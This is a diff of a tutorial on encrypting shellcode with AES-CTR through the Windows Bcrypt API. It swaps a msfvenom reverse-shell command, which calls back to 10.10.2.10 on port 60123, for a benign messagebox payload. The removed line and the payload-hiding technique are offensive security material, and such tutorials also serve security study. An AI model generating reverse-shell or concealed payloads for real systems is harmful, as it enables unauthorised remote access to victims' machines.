@@ -87,7 +87,7 @@ AES encrypts `IV || counter` with the key to generate a **keystream**, which is 
 
 We will use [Windows API](https://learn.microsoft.com/en-us/windows/win32/seccng/typical-cng-programming?source=recommendations) to make our cipher. we will use Bcrypt to import the necessary functions to encrypt our payload.
 1. Generate shellcode with the following command
-   `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.2.10 LPORT=60123 -f c`
+   `msfvenom -p windows/x64/messagebox TEXT="Hello" -f c -a x64`
 2. As always help yourself with the docs to understand the meaning of functions.
 
 ```c
